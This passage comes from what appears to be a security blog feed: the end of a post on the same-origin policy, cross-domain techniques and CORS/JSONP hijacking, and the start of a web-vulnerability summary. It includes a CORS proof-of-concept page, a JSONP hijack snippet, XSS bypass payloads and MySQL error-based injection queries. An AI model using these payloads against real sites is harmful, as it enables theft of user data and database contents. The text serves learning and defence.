class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    /**</span><br><span class="line">     * 使用document.domain解决iframe父子模块跨域的问题</span><br><span class="line">     */</span><br><span class="line">    console.log(document.domain); //localhost</span><br><span class="line">    let childDomain = document.domain;</span><br><span class="line">    document.domain = childDomain;</span><br><span class="line">    let parentDate = top.parentDate;</span><br><span class="line">    console.log(&quot;从父域获取到的数据&quot;,parentDate);   </span><br><span class="line">    // 此处打印数据为</span><br><span class="line">    // &#123;</span><br><span class="line">    //     &quot;name&quot;: &quot;hello world!&quot;,</span><br><span class="line">    //     &quot;age&quot;: 18</span><br><span class="line">    // &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/05/同源策略那些事/1571739380398.png" alt="Alt text"></p><h4 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h4><p>window.name有一个奇妙的性质，<br>页面如果设置了window.name，那么在不关闭页面的情况下，<br>即使进行了页面跳转location.href=…，这个window.name还是会保留。</p><p>利用window.name的性质，我们可以在iframe中加载一个跨域页面。</p><p>这个页面载入之后，让它设置自己的window.name，<br>然后再让它进行当前页面的跳转，跳转到与iframe外的页面同域的页面，<br>此时window.name是不会改变的。</p><p>这样，iframe内外就属于同一个域了，且window.name还是跨域的页面所设置的值。</p><p>假设我们有3个页面，</p><blockquote><p>a.com/index.html<br>a.com/empty.html<br>b.com/index.html</p></blockquote><p>（1）在a.com/index.html页面中嵌入一个iframe，设置src为b.com/index.html<br>（2）b.com/index.html载入后，设置window.name，然后再使用location.href=’a.com/empty.html’跳转到与iframe外页面同域的页面中。<br>（3）在a.com/index.html页面中，就可以通过$(‘iframe’).contentWindow.name来获取iframe内页面a.com/empty.html的window.name值了，而这个值正是b.com/index.html设置的。</p><h4 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage"></a>window.postMessage</h4><p><code>window.postMessage(message, targetOrgin)</code>方法是html5新引进的特性。<br>调用postMessage方法的window对象是指要接受消息的哪一个window对象，该方法的第一个参数message为要发送的消息，类型只能为字符串；第二个参数targetOrgin用来限定接收消息的那个window对象所在的域，如果不想限定域，可以使用通配符*。</p><p>需要接收消息的window对象，可是通过监听自身的message时间来获取传过来的消息，消息内容存储在该事件对象的data属性中。</p><h4 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h4><p>location.hash 方式跨域，是子框架具有修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。</p><p>详细参考：<a href="https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html#m4" target="_blank" rel="external">https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html#m4</a><br>a.html欲与b.html跨域相互通信，通过中间页c.html来实现。 三个页面，不同域之间利用iframe的location.hash传值，相同域之间直接js访问来通信。<br>具体实现步骤：一开始a.html给b.html传一个hash值，然后b.html收到hash值后，再把hash值传递给c.html，最后c.html将结果放到a.html的hash值中。<br><img src="/2019/11/05/同源策略那些事/1571649644093.png" alt="Alt text"></p><h4 id="flash"><a href="#flash" class="headerlink" title="flash"></a>flash</h4><p>flash有自己的一套安全策略，服务器可以通过crossdomain.xml文件来声明能被哪些域的SWF文件访问，SWF也可以通过API来确定自身能被哪些域的SWF加载。<br>具体见：<a href="https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html" target="_blank" rel="external">https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html</a></p><h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>JSON with Padding，就是利用script标签没有跨域限制的特性，使得网页可以从其他来源域动态获取Json数据。JSONP跨域请求一定需要对方的服务器支持才可以。</p><p>JSONP实现流程：<br>1.定义一个 回调函数 handleResponse 用来接收返回的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function handleResponse(data) &#123;</span><br><span class="line">    console.log(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>2.动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var body = document.getElementsByTagName(&apos;body&apos;)[0];</span><br><span class="line">var script = document.gerElement(&apos;script&apos;);</span><br><span class="line">script.src = &apos;http://test.com/json?callback=handleResponse&apos;;</span><br><span class="line">body.appendChild(script);</span><br></pre></td></tr></table></figure><p>3.通过 script.src 请求 <a href="http://test.com/json?callback=handleResponse，" target="_blank" rel="external">http://test.com/json?callback=handleResponse，</a><br>4.后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse({“name”: “twosmi1e”}) 给浏览器<br>5.浏览器在接收到 handleResponse({“name”: “twosmi1e”}) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。</p><h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>CORS(Cross-Origin Resource Sharing, 跨源资源共享)是W3C出的一个标准，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p><p>实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。</p><p><img src="/2019/11/05/同源策略那些事/1571651017211.png" alt="Alt text"><br>大致流程：</p><ol><li>请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加Origin头，用于声明请求方的源；</li><li>资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源；</li><li>浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许；<br><img src="/2019/11/05/同源策略那些事/1571652055585.png" alt="Alt text"><h5 id="请求分类"><a href="#请求分类" class="headerlink" title="请求分类"></a>请求分类</h5>浏览器将CORS请求分成两类：<strong>简单请求（simple request）</strong>和<strong>非简单请求（not-so-simple request）</strong></li></ol><ul><li>简单请求满足以下条件：</li></ul><ol><li>使用下列方法之一：GET、HEAD、POST</li><li>HTTP的头信息不超出以下几种字段:Accept、Accept-Language、Content-Language、Content-Type（其值仅限于：application/x-www-form-urlencoded、multipart/form-data、text/plain）</li></ol><ul><li>非简单请求：不满足简单请求外的请求。<br>不满足简单请求条件的请求则要先进行预检请求，即使用OPTIONS方法发起一个预检请求到服务器，用于浏览器询问服务器当前网页所在的域名是否在服务器允许访问的白名单中，以及允许使用哪些HTTP方法和字段等。只有得到服务器肯定的相应，浏览器才会发送正式的XHR请求，否则报错。</li></ul><h5 id="HTTP头字段"><a href="#HTTP头字段" class="headerlink" title="HTTP头字段"></a>HTTP头字段</h5><ul><li>Access-Control-Allow-Origin: 允许跨域访问的域，可以是一个域的列表，也可以是通配符”*”。<br>注意Origin规则只对域名有效，并不会对子目录有效。不同子域名需要分开设置。</li><li>Access-Control-Allow-Credentials: 是否允许请求带有验证信息，这部分将会在下面详细解释</li><li>Access-Control-Expose-Headers: 允许脚本访问的返回头，请求成功后，脚本可以在XMLHttpRequest中访问这些头的信息(貌似webkit没有实现这个)</li><li>Access-Control-Max-Age: 缓存此次请求的秒数。在这个时间范围内，所有同类型的请求都将不再发送预检请求而是直接使用此次返回的头作为判断依据，非常有用，大幅优化请求次数</li><li>Access-Control-Allow-Methods: 允许使用的请求方法，以逗号隔开</li><li>Access-Control-Allow-Headers: 允许自定义的头部，以逗号隔开，大小写不敏感<h2 id="相关的一些安全问题"><a href="#相关的一些安全问题" class="headerlink" title="相关的一些安全问题"></a>相关的一些安全问题</h2><h3 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4>CORS跨域漏洞的本质是服务器配置不当，即Access-Control-Allow-Origin设置为*或是直接取自请求头Origin字段，Access-Control-Allow-Credentials设置为true。<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4>最近遇到的某站<br>对Access-Control-Allow-Origin未做限制</li></ul><p><img src="/2019/11/05/同源策略那些事/1_meitu_1.jpg" alt="Alt text"><br>在本地做一个泛解析将<a href="http://target.com.\*解析到本地，然后构造POC请求目标站点" target="_blank" rel="external">http://target.com.\*解析到本地，然后构造POC请求目标站点</a></p><p>POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h2&gt;CORS POC Exploit&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;Extract SID&lt;/h3&gt;</span><br><span class="line"> </span><br><span class="line">&lt;div id=&quot;demo&quot;&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">function cors() &#123;</span><br><span class="line">  var xhttp = new XMLHttpRequest();</span><br><span class="line">  xhttp.onreadystatechange = function() &#123;</span><br><span class="line">    if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">      document.getElementById(&quot;demo&quot;).innerHTML = alert(this.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(&quot;GET&quot;, &quot;https://target.com&quot;, true);</span><br><span class="line">  xhttp.withCredentials = true;</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/05/同源策略那些事/2_meitu_2_meitu_3.jpg" alt="Alt text"><br>能获取到一些敏感信息甚至token。</p><h4 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h4><p><a href="https://github.com/chenjj/CORScanner" target="_blank" rel="external">https://github.com/chenjj/CORScanner</a></p><h4 id="CORS与CSRF的区别"><a href="#CORS与CSRF的区别" class="headerlink" title="CORS与CSRF的区别"></a>CORS与CSRF的区别</h4><p>CORS 机制的目的是为了解决脚本的跨域资源请求问题，不是为了防止 CSRF。</p><p>CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。</p><p>脚本的跨域请求在同源策略的限制下，响应会被拦截，即阻止获取响应，但是请求还是发送到了后端服务器。</p><p>相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。</p><p>不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>这种漏洞不痛不痒在国内日常被忽略，正则写好写严格就能很好防御，更多的一些利用方式参考<a href="https://xz.aliyun.com/t/2745" target="_blank" rel="external">https://xz.aliyun.com/t/2745</a></p><h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>JSONP劫持实际上也算是CSRF的一种。当某网站使用JSONP的方式来跨域传递一些敏感信息时，攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p><h4 id="一些案例"><a href="#一些案例" class="headerlink" title="一些案例"></a>一些案例</h4><p><a href="https://shuimugan.com/bug/view?bug_no=118712" target="_blank" rel="external">苏宁易购多接口问题可泄露用户姓名、地址、订单商品（jsonp案例）</a><br><a href="https://shuimugan.com/bug/view?bug_no=122755" target="_blank" rel="external">唯品会某处JSONP+CSRF泄露重要信息</a><br><a href="https://shuimugan.com/bug/view?bug_no=171499" target="_blank" rel="external">新浪微博JSONP劫持之点我链接开始微博蠕虫+刷粉丝</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>JSON实际应用的时候会有两种传输数据的方式：</p><p>xmlhttp获取数据方式：<br><code>{&quot;username&quot;:&quot;twosmi1e&quot;,&quot;password&quot;:&quot;test123&quot;}</code></p><p>当在前端获取数据的时候，由于数据获取方和数据提供方属于同一个域下面，所以可以使用 xmlhttp的方式来获取数据，然后再用xmlhttp获取到的数据传入自己的js逻辑如eval。</p><p>script获取数据方式：<br><code>userinfo={&quot;username&quot;:&quot;twosmi1e&quot;,&quot;password&quot;:&quot;test123&quot;}</code></p><p>如果传输的数据在两个不同的域，由于在javascript里无法跨域获取数据，所以一般采取script标签的方式获取数据，传入一些callback来获取最终的数据，如果缺乏有效地控制(对referer或者token的检查)就有可能造成敏感信息被劫持。</p><p><code>&lt;script src=&quot;http://www.test.com/userdata.php?callback=userinfo&quot;&gt;&lt;/script&gt;</code></p><p>简单POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">＜script＞ </span><br><span class="line">function jsonph(json)&#123; </span><br><span class="line">alert(JSON.stringify(json)) </span><br><span class="line">  &#125; </span><br><span class="line">＜/script＞  </span><br><span class="line"></span><br><span class="line">＜script src=&quot;https://target.com?callback=jsonph&quot;＞＜/script＞</span><br></pre></td></tr></table></figure></p><h3 id="SOME"><a href="#SOME" class="headerlink" title="SOME"></a>SOME</h3><p>SOME（Same Origin Method Execution），同源方式执行，不同于 XSS 盗取用户 cookie 为目的，直接劫持 cookie 经行操作，和 CSRF 攻击很类似，不同的是 CSRF 是构造一个请求，而 SOME 则希望脚本代码被执行。<br>靶场：<a href="https://www.someattack.com/Playground/About" target="_blank" rel="external">https://www.someattack.com/Playground/About</a><br>具体可以看：<a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/169873.html</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近学习的这方面知识时做了些笔记，于是有了这篇文章，有什么错误请大佬们指正，前端这块还是挺有意思的。各种小的漏洞组合起来也有很多精彩的利用方式。希望以后也能挖出更多有意思的洞。</p><p><strong>一些比较精彩的漏洞挖掘案例</strong>：<br><a href="https://xz.aliyun.com/t/3514" target="_blank" rel="external">https://xz.aliyun.com/t/3514</a><br><a href="https://www.freebuf.com/articles/web/164069.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/164069.html</a><br><a href="https://www.phpyuan.com/262163.html" target="_blank" rel="external">https://www.phpyuan.com/262163.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="external">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a><br><a href="https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html" target="_blank" rel="external">https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html</a><br><a href="https://segmentfault.com/a/1190000009624849" target="_blank" rel="external">https://segmentfault.com/a/1190000009624849</a><br><a href="https://www.jianshu.com/p/835bc9534281" target="_blank" rel="external">https://www.jianshu.com/p/835bc9534281</a><br><a href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/" target="_blank" rel="external">https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</a><br><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/169873.html</a><br><a href="https://www.anquanke.com/post/id/97671" target="_blank" rel="external">https://www.anquanke.com/post/id/97671</a><br><a href="http://drops.xmd5.com/static/drops/papers-42.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-42.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于&lt;a href=&quot;https://xz.aliyun.com/t/6614&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;先知社区&lt;/a&gt;,转载请注明来源。&lt;/p&gt;
&lt;h2 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;hea
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://www.twosmi1e.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="同源策略" scheme="https://www.twosmi1e.com/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    
      <category term="前端安全" scheme="https://www.twosmi1e.com/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>WEB基础漏洞</title>
    <link href="https://www.twosmi1e.com/2019/11/04/WEB%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.twosmi1e.com/2019/11/04/WEB基础漏洞/</id>
    <published>2019-11-04T10:07:01.000Z</published>
    <updated>2019-11-04T10:20:04.601Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2019/11/04/WEB基础漏洞/WEB基础漏洞.png" alt="Alt text"><br><img src="/2019/11/04/WEB基础漏洞/挖洞思维导图.png" alt="Alt text"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对所学知识的一些概括性总结吧，持续更新</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><p><strong>XSS 的本质</strong>是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p><h3 id="输入来源"><a href="#输入来源" class="headerlink" title="输入来源"></a>输入来源</h3><ul><li>来自用户的 UGC 信息</li><li>第三方链接</li><li>URL参数</li><li>POST参数</li><li>Referer</li><li>Cookie</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:center">存储区</th><th style="text-align:center">插入点</th></tr></thead><tbody><tr><td style="text-align:center">反射型</td><td style="text-align:center">URL</td><td style="text-align:center">HTML</td></tr><tr><td style="text-align:center">存储型</td><td style="text-align:center">后端数据库</td><td style="text-align:center">HTML</td></tr><tr><td style="text-align:center">DOM型</td><td style="text-align:center">后端数据库/前端存储/URL</td><td style="text-align:center">JavaScript</td></tr></tbody></table><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>常见于通过URL传递参数的功能，如网站搜索、跳转等。<br>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>常见于带用户保存数据的网站功能，如论坛留言板，商品评论等<br><strong>存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</strong></p><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于<strong>前端 JavaScript 自身的安全漏洞</strong>，而其他两种 XSS 都属于<strong>服务端的安全漏洞</strong>。</p><h3 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h3><ul><li>大小写</li><li>多重嵌套</li><li>宽字节绕过 </li><li>href属性中的伪协议</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(&apos;/a/&apos;)&gt;adas&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li>HTML5新标签</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;math&gt;标签</span><br><span class="line">&lt;embed&gt;标签</span><br><span class="line">&lt;svg&gt;</span><br></pre></td></tr></table></figure><ul><li>DataUrl协议</li></ul><h4 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h4><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p><ul><li>禁止加载外域代码，防止复杂的攻击逻辑。</li><li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li><li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li><li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li><li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li></ul><h4 id="输入长度控制"><a href="#输入长度控制" class="headerlink" title="输入长度控制"></a>输入长度控制</h4><h4 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http-Only"></a>Http-Only</h4><p>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</p><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>脚本在接收前台传过来的数据时,没有对该数据进行很好的安全检查就直接丢到数据库中去操作,导致入侵者在前台随正常数据一起提交过来的恶意sql语句也被一并带入数据库中执行[各种子查询,联合查询…],也就是说,注入的本质,只是数据库本身,与后端脚本,系统平台无关。</p><h3 id="可能存在的地方"><a href="#可能存在的地方" class="headerlink" title="可能存在的地方"></a>可能存在的地方</h3><p><strong>任何与后端数据库交互的地方</strong><br>黑盒思路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get请求的url,正常情况下这里应该是最先会尝试的地方</span><br><span class="line">post数据字段中,数据较多时一般都会用post传,会是个不错的入手点</span><br><span class="line">cookie中传的数据,有些还可能会把一些参数放在cookie中传,所以这儿也会是个不错的入手点</span><br><span class="line">Referer本身用来记录上一个页面的url,但一旦被存到数据库中之后又被带入查询,你懂的 </span><br><span class="line">User-agent 本身用来记录客户端信息,只要被记录到数据库之后又被带入查询一样可被利用</span><br><span class="line">X-Forwarded-For 本身专门用来记录客户端真实ip,如果脚本在处理时把它也带到数据库中去查询...</span><br><span class="line">宽字节[双字节],主要是由于前后端编码不统一造成理解歧义</span><br></pre></td></tr></table></figure><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ol><li>在当前数据库用户权限够的时候,一般为数据库管理员。<ul><li>执行系统命令,但这并不直接就等于’提权’,具体权限的大小还要取决于你服务用户的系统权限。</li><li>写文件,比如,我们可能会尝试往目标网站目录中写webshell,但能不能写进去,还要看目录具体权限。</li><li>读文件,尝试读取带有账号密码的各类敏感配置文件,然后再想办法配合其它的漏洞一起利用。</li></ul></li><li>在当前数据库用户权限一般的时候,比如,只能在指定的库中进行正常的增删改查。<ul><li>像这种情况,一般我们可能会尝试查出目标网站管理员的账号和密码hash,然后再登到后台传webshell。</li><li>或者搜集各种能搜集到[有权限]的各类用户密码数据,时刻为后面的字典作准备,以备不时之需。</li></ul></li></ol><h3 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h3><ol><li>主要分为以下两类：</li></ol><ul><li>数字型</li><li>字符型</li></ul><ol start="2"><li>细分的话可以分为：</li></ol><ul><li>联合查询注入</li><li>多语句查询注入</li><li>报错注入</li><li>布尔型注入</li><li>基于时间延迟注入</li><li>宽字节注入</li><li>等等</li></ul><h3 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h3><p><img src="/2019/11/04/WEB基础漏洞/1571282212656.png" alt="Alt text"><br><img src="/2019/11/04/WEB基础漏洞/1571282228237.png" alt="Alt text"></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><img src="/2019/11/04/WEB基础漏洞/1571282717191.png" alt="Alt text"></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><ol><li>floor方式<br>需要同时满足floor(rand(0)<em>2)，count(</em>)，group by这三个函数</li><li>updateaxml(),extractvalue()函数<br>mysql5.1.5，最多爆出32位的</li><li>exp()函数<br>在MySQL版本大于等于5.5.5的的时候才能用</li></ol><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><h5 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and (select 1 from (select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))a from information_schema.tables group by a)b);</span><br></pre></td></tr></table></figure><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and updatexml(1,concat(0x7e,database(),0x7e),1);</span><br></pre></td></tr></table></figure><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and extractvalue(1,concat(0x7e,database(),0x7e));</span><br></pre></td></tr></table></figure><p>如果<code>concat</code>被过滤，可使用<code>make_set</code>代替<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = 1 and updatexml(1,make_set(3,0x7e,database()),1);</span><br><span class="line">mysql&gt; select * from users where id = 1 and extractvalue(1,make_set(3,0x7e,database()));</span><br></pre></td></tr></table></figure></p><h5 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from(select * from users a join users b)c;</span><br></pre></td></tr></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">database</span>())x));</span><br></pre></td></tr></table></figure><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li>参数过滤</li></ol><ul><li>PHP过滤函数和类：<code>addslashes()</code>, <code>mysql_escape_string</code>,<code>intval</code></li></ul><ol start="2"><li>预编译处理：先执行sql语句，再传参，即使参数中有sql命令也不会执行</li></ol><ul><li>执行预编译语句</li><li>设置变量</li><li>执行语句</li></ul><ol start="3"><li>ODBC:Open DataBase Connectivity用于数据库访问的应用程序编程接口（API）</li><li>PDO:PHP Data Objects对多种数据库提供统一操作方法的数据库访问层</li></ol><h3 id="常用过滤绕过"><a href="#常用过滤绕过" class="headerlink" title="常用过滤绕过"></a>常用过滤绕过</h3><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><ul><li>双空格</li><li>注释绕过/**/</li><li>tab绕过</li><li>%a0</li><li>()括号</li></ul><h4 id="等号"><a href="#等号" class="headerlink" title="等号"></a>等号</h4><ul><li>like</li><li>in</li><li><code>&lt;</code>或者<code>&gt;</code></li></ul><h4 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h4><ul><li>引号内容加上引号使用十六进制</li></ul><h4 id="尖括号"><a href="#尖括号" class="headerlink" title="尖括号"></a>尖括号</h4><ul><li>between</li><li>greatest</li><li>leatest</li></ul><h3 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h3><h4 id="select-into-outfile"><a href="#select-into-outfile" class="headerlink" title="select into outfile"></a>select into outfile</h4><ol><li>要有file_priv权限  </li><li>知道网站绝对路径  </li><li>要能用union  </li><li>对web目录有写权限  </li><li>没有过滤单引号</li></ol><h4 id="udf提权"><a href="#udf提权" class="headerlink" 